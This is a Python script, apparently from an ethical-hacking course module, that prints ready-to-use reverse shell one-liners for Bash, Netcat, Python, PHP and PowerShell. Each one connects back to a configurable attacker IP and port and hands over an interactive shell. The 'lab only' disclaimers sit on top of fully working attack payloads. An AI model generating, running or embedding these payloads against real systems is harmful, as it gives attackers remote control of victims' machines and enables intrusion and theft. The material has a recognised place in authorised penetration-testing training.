#!/usr/bin/env python3
# LAB-ONLY: Reverse Shell Payload Generator
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates reverse shells for various languages!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "443"
# -----------------------------------------------------------------------------------

def generate_payloads(ip, port):
    payloads = []
    # Bash
    payloads.append(("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"))
    # Netcat
    payloads.append(("Netcat", f"nc {ip} {port} -e /bin/bash"))
    payloads.append(("Netcat (mkfifo)", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"))
    # Python
    payloads.append(("Python", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"))
    # PHP
    payloads.append(("PHP", f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>"))
    # PowerShell
    payloads.append(("PowerShell", f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$x = ($error[0] | Out-String);$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""))
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Reverse Shell Payload Generator")
    print("="*80)
    print(f"[*] Attacker IP: {LAB_ATTACKER_IP}")
    print(f"[*] Attacker Port: {LAB_ATTACKER_PORT}")
    print("-"*80)
    for name, payload in generate_payloads(LAB_ATTACKER_IP, LAB_ATTACKER_PORT):
        print(f"\n[*] {name}:")
        print("-"*40)
        print(payload)
        print()

if __name__ == "__main__":
    main()
